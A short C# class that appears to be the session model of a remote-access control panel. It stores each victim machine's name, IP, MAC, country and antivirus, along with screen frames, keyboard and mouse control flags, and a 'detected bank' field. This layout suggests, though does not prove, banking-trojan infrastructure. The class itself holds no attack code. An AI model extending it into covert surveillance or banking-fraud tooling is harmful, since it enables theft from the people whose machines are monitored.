using System;
using System.Threading.Tasks;
using ExemploGrpc;

public class ClientSession
{
    public string Id { get; set; } = Guid.NewGuid().ToString();
    public string PcName { get; set; } = "";
    public string Ip { get; set; } = "";
    public DateTime ConnectedAt { get; set; } = DateTime.Now;

    public string Country { get; set; } = "";
    public string MacAddress { get; set; } = "";
    public string Antivirus { get; set; } = "";

    public int PingMs { get; set; }
    public bool IsKeyboardEnabled { get; set; }
    public bool IsMouseEnabled { get; set; }

    // 🔹 resolução da tela do cliente
    public int ScreenWidth { get; set; }
    public int ScreenHeight { get; set; }

    // multi-monitor info
    public int MonitorIndex { get; set; }
    public int MonitorsCount { get; set; }

    // 🏦 detecção de banco
    public string? DetectedBank { get; set; }
    public DateTime? LastBankDetection { get; set; }

    public byte[]? LastFrameJpeg { get; set; }

    // 🔹 para enviar comandos pro cliente
    public Func<ScreenCommand, Task>? SendCommandAsync { get; set; }

    public event Action? FrameUpdated;

    public void UpdateFrame(byte[] frame)
    {
        LastFrameJpeg = frame;
        FrameUpdated?.Invoke();
    }

    public override string ToString() => $"{PcName} ({Ip})";
}
